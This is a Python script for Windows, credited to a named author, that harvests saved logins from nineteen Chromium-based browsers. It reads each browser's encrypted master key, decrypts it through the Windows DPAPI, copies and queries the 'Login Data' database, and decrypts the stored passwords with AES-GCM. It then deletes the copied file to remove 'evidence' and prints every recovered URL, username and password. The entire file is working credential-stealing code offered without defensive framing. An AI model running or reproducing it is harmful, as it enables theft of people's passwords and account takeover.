
# Created by Noah Pearson (6e6f6168 aka vanillablunt)

import base64
import json
import os
import random
import shutil
import sqlite3
import string
import tempfile
import traceback
import time
from Crypto.Cipher import AES

from ctypes import c_buffer, Structure, POINTER, c_char, WinDLL, byref, c_void_p, create_string_buffer, memmove, sizeof
from ctypes.wintypes import DWORD, BOOL, LPWSTR, HWND, LPCWSTR, LPVOID

# These are structures and DLLs needed for decryption
# \/


class datablob(Structure):
    _fields_ = [('cbData', DWORD),('pbData', POINTER(c_char))]

class promptstruct(Structure):
    _fields_ = [('cbSize', DWORD),('dwPromptFlags', DWORD),('hwndApp', HWND),('szPrompt', LPCWSTR),]

kernel32 = WinDLL('kernel32', use_last_error=True)
localf = kernel32.LocalFree
#localf.restype = LPVOID
#localf.argtypes = [LPVOID]

crypt32 = WinDLL('crypt32', use_last_error=True)
crypt = crypt32.CryptUnprotectData
#crypt.restype = BOOL
#crypt.argtypes = [POINTER(datablob), POINTER(LPWSTR), POINTER(datablob), c_void_p, POINTER(promptstruct), DWORD, POINTER(datablob)]


# /\
# These are structures and DLLs needed for decryption


chromium_browsers = [
    'LOCALAPPDATA\\7Star\\7Star\\User Data',
    'LOCALAPPDATA\\Amigo\\User Data',
    'LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data',
    'LOCALAPPDATA\\CentBrowser\\User Data',
    'LOCALAPPDATA\\Chedot\\User Data',
    'LOCALAPPDATA\\Google\\Chrome SxS\\User Data',
    'LOCALAPPDATA\\Chromium\\User Data',
    'LOCALAPPDATA\\Microsoft\\Edge\\User Data',
    'LOCALAPPDATA\\CocCoc\\Browser\\User Data',
    'LOCALAPPDATA\\Elements Browser\\User Data',
    'LOCALAPPDATA\\Epic Privacy Browser\\User Data',
    'LOCALAPPDATA\\Google\\Chrome\\User Data',
    'LOCALAPPDATA\\Kometa\\User Data',
    'APPDATA\\Opera Software\\Opera Stable',
    'LOCALAPPDATA\\Orbitum\\User Data',
    'LOCALAPPDATA\\Sputnik\\Sputnik\\User Data',
    'LOCALAPPDATA\\Torch\\User Data',
    'LOCALAPPDATA\\uCozMedia\\Uran\\User Data',
    'LOCALAPPDATA\\Vivaldi\\User Data'
]

existing_browsers = []
exploitable_browsers = []
logins = []

# Format LocalAppData and AppData locations and see if the browser folder eixsts
for browser_location in chromium_browsers:
    browser_location = browser_location.replace("LOCALAPPDATA",os.getenv("localappdata")).replace("APPDATA",os.getenv("appdata"))
    if os.path.exists(browser_location):
        existing_browsers.append(browser_location)

# If the browser folder exists, we need to see if there are the proper database files
for browser_location in existing_browsers:
    if os.path.exists(browser_location+"\\Local State") and os.path.exists(browser_location + "\\Default\\Login Data"):
        exploitable_browsers.append(browser_location)

# Loop through all browsers
for browser_location in exploitable_browsers:
    local_state_path = browser_location + "\\Local State"
    login_data_path = browser_location + "\\Default\\Login Data"
    # Open 'Local State' file to get key
    with open(local_state_path) as local_state_file:
        # Get key from Local State file (Encrypted Master Key)
        key = base64.b64decode(json.load(local_state_file)["os_crypt"]["encrypted_key"])
        key = key[5:]
        # Create buffer and blob for decryption
        bufferIn = c_buffer(key,len(key))
        blobIn = datablob(len(key),bufferIn)
        blobOut = datablob()
        # Decrypt blob information
        crypt(byref(blobIn),None,None,None,None,0,byref(blobOut))
        # Get response of decrypted string (Master Key)
        buffer = create_string_buffer(blobOut.cbData)
        memmove(buffer, blobOut.pbData, sizeof(buffer))
        #localf(pbData)
        # Key is the raw (string) value of said buffer (Master Key)
        key = buffer.raw
        # Copy database to temp location to prevent database locking
        copied_database = str(os.getenv('temp')+"\\bigmeme")
        shutil.copyfile(login_data_path,copied_database)
        # Connect to the database, and query our wanted fields
        conn = sqlite3.connect(copied_database)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for url, username, password in cursor.fetchall():
            if url and username and password:
                # Make sure its a Chromium key v10
                if password[:3] == b'v10':
                    # Create cipher based off of decrypted master key and decrypt password
                    cipher = AES.new(key, AES.MODE_GCM, password[3:15])
                    password = cipher.decrypt(password[15:])
                    password = password[:-16].decode()
                    logins.append((url,username,password))
        conn.close()
        # Delete evidence that is copied database
        os.remove(copied_database)

print("""
-------------------
Chromium Logins
-------------------
""")
for login in logins:
    if login[0] and login[1] and login[2]:
        print("URL: "+login[0])
        print("Username: "+login[1])
        print("Password: "+login[2])
        print("")
